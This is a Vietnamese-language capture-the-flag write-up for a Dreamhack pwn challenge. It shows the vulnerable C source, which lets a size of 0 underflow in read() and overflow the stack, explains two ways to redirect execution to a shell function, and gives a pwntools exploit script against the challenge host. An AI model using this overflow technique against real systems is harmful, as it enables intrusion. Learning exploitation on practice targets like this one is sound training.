```sh
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];    # khai báo mảng 256 byte 
    int size;

    initialize();

    signal(SIGSEGV, get_shell);    # Nếu chương trình lỗi thì nhảy tới get_shell

    printf("Size: ");
    scanf("%d", &size);         # Nhập giá trị của size 

    if (size > 256 || size < 0)           # Điều kiện của size = {0,256} và >256,<0
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);              # Với size = 0 thì `size - 1` sẽ tạo thành `-1` - số vô cùng lớn, ta có thể khai thác lỗi tràn bộ đệm

    return 0;
}
```
* Ta thấy với `size = 0` lúc này ta có hàm `read(0, buf, size -1)`, Tham số thứ 3 là `-1` khi chuyển sang unsinged sẽ thành 1 số cực kì lớn nên ta có thể ghi đè vào địa chỉ trả về được
* Ở đây ta có thể khai thác theo 2 cách, vì có thể ghi đè vào địa chỉ trả về 1 địa chỉ hay 1 chuỗi khác nên ta có thể làm :
*  - Cách 1 : ta ghi đè địa chỉ trả về bằng địa chỉ của hàm `get_shell`
   - Cách 2 : ta ghi đè địa chỉ trả về bằng 1 chuỗi 4 byte bất kì và khi kết thúc hàm main nó tìm tới chuỗi đó và thực thi, vì chuỗi này ko tồn tại trên stack nên chương trình sẽ báo lỗi `SIGSEGV` và nhảy tới thực thi hàm `get_shell`

* exploi.py
```sh
from pwn import * 

p = remote("host3.dreamhack.games", 9116)

p.sendlineafter("Size:", b'0')

get_shell =   0x08048659 
payload = b'A'*260 + p32(get_shell)    # có thể thay 2 dòng này = `payload = b'A'*260 + b'A'*4`

p.sendlineafter("Data:", payload)

p.interactive()
```
